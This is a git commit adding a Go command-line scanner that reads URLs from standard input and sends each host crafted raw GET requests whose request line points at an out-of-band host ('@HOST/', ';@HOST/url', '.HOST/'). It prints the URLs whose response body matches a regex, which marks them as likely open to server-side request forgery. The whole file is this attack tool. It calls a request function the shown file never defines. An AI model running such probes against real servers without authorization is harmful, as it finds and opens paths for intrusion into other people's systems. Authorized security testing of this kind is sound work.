a48b113239a17694577a18b575df8c07c086200c
raoufmaklouf <raoufmaklouf0int@gmail.com>
2024-01-21 15:33:56 +0000

    Add files via upload

---
+++ main.go
@@ -0,0 +1,126 @@
+package main
+
+import (
+	"bufio"
+	"flag"
+	"fmt"
+	"net/url"
+	"os"
+	"strconv"
+	"strings"
+	"sync"
+)
+
+var wg sync.WaitGroup
+
+func main() {
+	oobHost := flag.String("h", "", "oob host")
+	rg := flag.String("r", "", "regex")
+	flag.Parse()
+	payloads := []string{
+		";@__HOST__/url",
+		"@__HOST__/",
+		".__HOST__/",
+	}
+	scanner := bufio.NewScanner(os.Stdin)
+
+	for scanner.Scan() {
+		url := scanner.Text()
+		wg.Add(1)
+		go func(u string) {
+			defer wg.Done()
+
+			Port, host, _, err := parseURL(u)
+			if err == nil {
+				port, _ := strconv.Atoi(Port)
+				for _, p := range payloads {
+					P := strings.ReplaceAll(p, "__HOST__", *oobHost)
+					r2 := normalRequest("GET", P, host, port)
+					if len(r2) > 1 {
+						_, b2, err := splitHTTPResponse(r2)
+						if err == nil {
+							if strings.Contains(b2, *rg) {
+								fmt.Println(url)
+
+							}
+						}
+					}
+
+				}
+
+			}
+		}(url)
+		wg.Wait()
+	}
+
+}
+
+func parseURL(inputURL string) (port, rootURL, path string, err error) {
+	// Parse the input URL
+	parsedURL, err := url.Parse(inputURL)
+	if err != nil {
+		return "", "", "", err
+	}
+
+	// Extract port from the Host
+	hostParts := strings.Split(parsedURL.Host, ":")
+	if len(hostParts) > 1 {
+		port = hostParts[1]
+	} else {
+		// Port not specified in URL, set default based on the scheme
+		if parsedURL.Scheme == "https" {
+			port = "443"
+		} else if parsedURL.Scheme == "http" {
+			port = "80"
+		}
+	}
+
+	// Construct root URL without the port and protocol
+	rootURL = hostParts[0]
+
+	// Extract path
+	path = parsedURL.Path
+
+	// If path is empty, set it to "/"
+	if path == "" {
+		path = "/"
+	}
+
+	return port, rootURL, path, nil
+}
+
+func splitHTTPResponse(response string) (string, string, error) {
+	// Find the position of the first double newline
+	index := strings.Index(response, "\r\n\r\n")
+
+	// Ensure that a double newline is found
+	if index == -1 {
+		return "", "", fmt.Errorf("malformed HTTP response")
+	}
+
+	// Extract headers and body
+	headers := strings.TrimSpace(response[:index])
+	body := strings.TrimSpace(response[index+2:])
+
+	return headers, body, nil
+}
+
+func extractStatusCode(rawResponse string) (int, error) {
+	// Create a scanner to read from the raw response string
+	scanner := bufio.NewScanner(strings.NewReader(rawResponse))
+
+	// Read the first line
+	if scanner.Scan() {
+		// Extract the status code from the status line
+		statusLine := scanner.Text()
+		var statusCode int
+		_, err := fmt.Sscanf(statusLine, "HTTP/1.1 %d", &statusCode)
+		if err != nil {
+			return 0, err
+		}
+		return statusCode, nil
+	}
+
+	// If the first line cannot be read, return an error
+	return 0, fmt.Errorf("malformed HTTP response")
+}
